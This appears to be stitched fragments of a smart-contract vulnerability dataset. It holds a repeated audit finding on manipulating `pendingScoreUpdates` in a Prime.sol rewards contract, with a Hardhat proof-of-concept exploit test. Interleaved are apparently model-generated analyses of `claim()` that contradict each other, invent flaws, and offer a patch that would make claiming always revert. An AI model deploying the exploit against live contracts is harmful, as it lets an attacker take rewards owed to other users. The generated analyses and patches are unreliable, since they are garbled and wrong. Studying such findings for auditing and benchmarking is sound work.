users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so.

This can lead to an incorrect calculation of the user's share in the reward distribution, and potentially result in fewer rewards than expected for that user.\n\nTo fix this vulnerability, the code should be modified so that the `accrueInterest` function is called after the reward distribution, and the total supply and total debt are updated by the total new interest when the accrual function is called. This ensures that users receive their fair share of rewards, accurately reflecting their contribution to the system.",

The reason for this is that the `accrueInterest()` function in the `_initializeMarkets()` function can be called multiple times by different users before the interest is actually calculated and distributed. This means that if one user calls `accrueInterest()` with a higher interest rate than another user, the second user's interest will be calculated using the wrong interest rate.\n\nFor example, consider two users, Alice and Bob, who both have an account in the same market. If Alice deposits $1000 and Bob deposits $500 into the market, and if the interest rate for that market is 2% per year, then Alice's interest will be calculated as $20, and Bob's interest will be calculated as $10. However, if Alice deposits another $1000 before Bob's interest is calculated, then Alice's interest will be calculated at a higher rate of 4% per year ($40), while Bob's interest will still be calculated using the old rate of 2% per year ($10). This means that Bob will receive less interest than Alice, even though he has a lower balance.\n\nTo prevent this vulnerability, the `accrueInterest()` function should be called only once before any user's interest is calculated and distributed.

        "gtraw": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

The reason for this assessment is as follows:\n\nFirstly, the `stakedAt` mapping tracks the timestamp of each user's last staking transaction. This ensures that users are only eligible to claim rewards after a certain period has passed (as specified by the `STAKING_PERIOD` constant). Therefore, there is no input validation required to check whether the `claim()` function is being called too soon after staking, which would be necessary to exploit the described vulnerability.\n\nSecondly, the `stakedAt` mapping is not modified within the `claim()` function, so it does not provide a mechanism for tracking or rejecting previously claimed tokens within the same transaction. This means that there is no opportunity for the smart contract to erroneously process duplicate rewards.\n\nLastly, while the `_mint()` and `_initializeMarkets()` functions are called after the `claim()` function modifies the `stakedAt` mapping, these functions do not appear to be vulnerable to any input validation issues. The `_mint()` function appears to simply mint a new token for the user and the `_initializeMarkets()` function appears to set up the initial market structure for that user's token.\n\nOverall, based on this assessment, it does not appear that the given smart contract code is vulnerable to the \"Input Validation Flaw in Reward Distribution Mechanism\" described above.",

One way to do this is by sorting the submitted list and checking for consecutive duplicate entries. Another option is to use a data structure such as a set that inherently prevents duplicates, or maintain a state that tracks already processed tokens within a transaction to prevent double-processing.\n\nHere is an example patch that includes these checks:\n```c\nfunction claim() external {\n    if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n    if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n    // Check for duplicate tokens in the list of rewards\n    uint256[] memory rewardTokens = _getRewardTokens(msg.sender);\n    for (uint i = 0; i < rewardTokens.length - 1; i++) {\n        if (rewardTokens[i] == rewardTokens[i + 1]) revert DuplicateToken();\n    }\n\n    stakedAt[msg.sender] = 0;\n\n    _mint(false, msg.sender);\n    _initializeMarkets(msg.sender);\n}\n```\nWith this patch, the smart contract code should no longer be vulnerable to the \"Input Validation Flaw in Reward Distribution Mechanism\" vulnerability.",

The `claim()` function updates the `stakedAt` mapping with the current timestamp, which means that even if a user has already claimed their tokens and moved them out of the staking period, they will still have a non-zero value in the `stakedAt` mapping. This can lead to locked tokens in the contract, as the unvested tokens might become unrecoverable forever.\n2. The `_mint()` function creates a new token and sends it to the user's address, which means that the user will have a non-zero balance of tokens, even though they are not supposed to be able to claim them yet. This can also lead to locked tokens in the contract.\n3.

Here's a detailed analysis of the code:\n\n1. The `claim()` function in the smart contract has two conditions that prevent a user from claiming rewards before their staking period is over and they have not already claimed their rewards. However, it does not check for any exceptional states such as shutdowns, which could allow users to exploit this vulnerability.\n2. In the `claim()` function, there is a call to `_mint(false, msg.sender)`, which mints new tokens and transfers them to the user's account. This means that if a user transfers their participation to a new account after the shutdown, they will be able to claim rewards using the outdated checkpoint value and disregarding the non-updated reward state for the new account.\n3. The `claim()` function also calls `_initializeMarkets(msg.sender)`, which initializes the market with the user's participation. This means that if a user transfers their participation to a new account after the shutdown, they will be able to claim rewards using the outdated checkpoint value and disregarding the non-updated reward state for the new account.\n\nTherefore, based on this analysis, I can conclude that the given smart contract code is vulnerable to the State Update Omission Vulnerability.",

Specifically, if the `claim()` function is called when the contract is in a shutdown mode (i.e., `block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD` returns false), then users who have not already claimed their rewards can transfer their participation to new accounts and claim the rewards as though they had been participating all along, using the outdated (often higher) checkpoint value and disregarding the non-updated reward state for the new account.\n\nTo mitigate this vulnerability, the smart contract could be modified to handle exceptional states more robustly. For example, when a shutdown is initiated, the `claim()` function could be disabled and any attempts to claim rewards should revert with an error message. Additionally, the `stakedAt` mapping could be updated to reflect the current state of the contract and prevent users from exploiting stale checkpoint states after state-updating functions have been halted.\n\nOverall, the smart contract code is vulnerable to a state update omission (SUO) vulnerability, and mitigation steps should be taken to ensure that the state checkpoints are properly closed off or continuously updated even during shutdown scenarios.",

This can be exploited by a malicious actor who can manipulate the `stakedAt` mapping, allowing them to repeatedly claim rewards for the same epoch without actually staking any tokens.\n\nTo fix this vulnerability, the smart contract code should be modified such that the `claim` function also checks if an address has already claimed rewards in the current or previous epoch. This can be achieved by adding a new mapping called `claimedAt`, which keeps track of the last epoch when an address claimed rewards.\n\nHere's an example of how the `claim` function could be modified to fix this vulnerability:\n```solidity\nfunction claim() external {\n    if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n    if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n    if (claimedAt[msg.sender] >= block.number) revert AlreadyClaimedRewardsForEpoch();\n\n    stakedAt[msg.sender] = 0;\n\n    _mint(false, msg.sender);\n    _initializeMarkets(msg.sender);\n\n    claimedAt[msg.sender] = block.number;\n}\n```\nIn this modified version of the `claim` function, we have added an additional check to see if the address has already claimed rewards for the current epoch or any previous one. If so, we revert the transaction with an error message indicating that the address is not eligible to claim rewards again.\n\nOverall, the smart contract code given is vulnerable to a replay attack due to its reliance on the `stakedAt` mapping, and this vulnerability can be fixed by adding a new mapping called `claimedAt` to keep track of the last",
                "poc_patch": "  Yes, the given smart contract code is vulnerable to the \"Double claim\" vulnerability. The reason for this is that the `claim` function allows a user to claim rewards multiple times by resetting their staked token balance to zero before minting new tokens and initializing the markets again. This means that the reward calculation will be based on the current state of the locked tokens, which could be manipulated by transferring the tokens to a new lock, generating a new token ID, and claiming rewards for the same epoch but with a different token ID.\n\nTo mitigate this vulnerability, a checkpoint mechanism should be implemented to prevent multiple claims within the same block or keep track of the locked token balances for each epoch, ensuring that rewards are calculated based on the state during the epoch change. This could be done by creating a new function `checkpoint()` that takes the current epoch as an argument and checks whether there has been a claim within the same block or not. If so, it reverts the transaction with an appropriate error message.\n\nAlternatively, a patch can be applied to the `claim` function by adding a check for the current staked token balance before resetting it to zero. This will prevent multiple claims from being made within the same block.\n\nHere is an example of how this could be implemented:\n```solidity\nfunction claim() external {\n    if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n    if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n    // Check for the current staked token balance before resetting it to zero\n    if (stakedAt[msg.sender] > 0) revert AlreadyClaimed();\n\n    stakedAt[msg.sender] = 0;\n\n    _mint(false, msg.sender);\n    _initializeMarkets(msg.sender);\n}\n```\nThis patch will prevent users from claiming rewards multiple times within the same block by checking for the current staked token balance before resetting it to zero.

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime 